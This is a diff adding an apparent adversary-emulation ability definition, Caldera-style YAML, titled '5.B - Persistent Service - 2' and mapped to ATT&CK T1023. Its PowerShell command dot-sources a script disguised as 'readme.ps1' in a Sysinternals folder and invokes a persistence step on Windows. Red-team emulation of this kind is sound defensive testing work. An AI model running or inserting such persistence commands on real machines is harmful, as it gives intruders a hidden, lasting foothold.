@@ -1,0 +1,24 @@
+---
+
+- id: 45f18b58-c14f-4b61-a3da-41b67af21429
+  name: 5.B - Persistent Service - 2
+  description: Leverage modified Sysinternals 
+  tactic: persistence
+  technique:
+    attack_id: T1023
+    name: Shortcut Modification
+  platforms:
+    windows:
+      psh, pshw:
+        command: |
+          Set-Location -path "C:\Program Files\SysinternalsSuite";
+          if (Test-Path -path "readme.ps1") {
+            . .\readme.ps1;
+            Invoke-Persistence -PersistStep 2;
+            write-host "[+] Persistence 2 invoked.";
+
+          } else {
+            write-host "[!] readme.ps1 not found.";
+            return 1;
+          }
+            
